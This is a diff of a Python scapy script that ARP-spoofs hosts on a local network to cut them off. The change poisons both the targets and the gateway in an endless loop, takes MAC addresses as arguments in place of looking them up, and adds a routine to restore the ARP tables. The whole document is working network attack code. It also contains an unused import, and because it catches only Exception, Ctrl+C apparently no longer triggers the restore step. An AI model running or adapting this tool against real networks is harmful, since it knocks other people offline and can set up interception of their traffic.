@@ -1,15 +1,6 @@
+from types import resolve_bases
 from scapy.all import *
 import time
-
-def get_mac(ip):
-    try:
-        arp_packet = ARP(pdst = ip)
-        broadcast_packet = Ether(dst ="ff:ff:ff:ff:ff:ff")
-        arp_to_broadcast = broadcast_packet / arp_packet
-        answered_list = srp(arp_to_broadcast, timeout = 5, verbose = False)[0]
-        return answered_list[0][1].hwsrc
-    except Exception:
-        return None
 
 
 
@@ -39,23 +30,25 @@ def restore(target_ip, gateway_to_change, target_mac, gateway_mac):
         except Exception:
             return False
 
-def kick_hosts(hosts, gateway):
+def kick_hosts(hosts, gateway, targets_MAC, gateway_MAC):
     try:
-        hosts_macs = [get_mac(host) for host in hosts]
-
-        gateway_mac = get_mac(gateway)
-
-        if not gateway_mac:
+        if not gateway_MAC:
             print("Can't find gateway's mac address")
             exit()
 
         print("Starting to kick...\n Press cntrl+c to stop")
         while True:
             for i, host in enumerate(hosts):
-                poison_host(host, gateway, hosts_macs[i])
+                poison_host(host, gateway, targets_MAC[i])
+                poison_host(gateway, host, gateway_MAC)
             time.sleep(5)
 
-    except KeyboardInterrupt:
-        for i, host in enumerate(hosts):
-            restore(host, gateway, hosts_macs[i] ,gateway_mac)
-        print("Stopped...")
+    except Exception:
+        restore_hosts(hosts, gateway, targets_MAC, gateway_MAC)
+
+def restore_hosts(hosts, gateway, targets_MAC, gateway_MAC):
+    for i, host in enumerate(hosts):
+        restore(host, gateway, targets_MAC[i] ,gateway_MAC)
+        restore(gateway, host, gateway_MAC, targets_MAC[i])
+    print("Stopped...")
+
